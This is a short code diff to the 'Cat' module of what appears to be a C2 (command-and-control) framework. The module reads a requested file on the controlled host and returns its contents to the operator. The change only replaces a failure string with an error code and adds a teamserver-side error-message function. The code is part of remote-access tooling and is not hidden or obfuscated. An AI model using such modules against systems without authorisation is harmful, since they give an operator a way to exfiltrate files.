@@ -78,6 +78,8 @@ int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 }
 
 
+#define ERROR_OPEN_FILE 1 
+
 int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
 	c2RetMessage.set_instruction(c2RetMessage.instruction());
@@ -86,16 +88,29 @@ int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 	std::string inputFile = c2Message.inputfile();
 	std::ifstream input(inputFile, std::ios::binary);
-	if( input ) 
+	if( !input.fail() ) 
 	{
 		std::string buffer(std::istreambuf_iterator<char>(input), {});
 		c2RetMessage.set_returnvalue(buffer);
 	}
 	else
 	{
-		c2RetMessage.set_returnvalue("Failed: Couldn't open file.");
+		c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
 	}
 
 	return 0;
 }
 
+
+int Cat::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
+{
+#ifdef BUILD_TEAMSERVER
+	int errorCode = c2RetMessage.errorCode();
+	if(errorCode>0)
+	{
+		if(errorCode==ERROR_OPEN_FILE)
+			errorMsg = "Failed: Couldn't open file";
+	}
+#endif
+	return 0;
+}
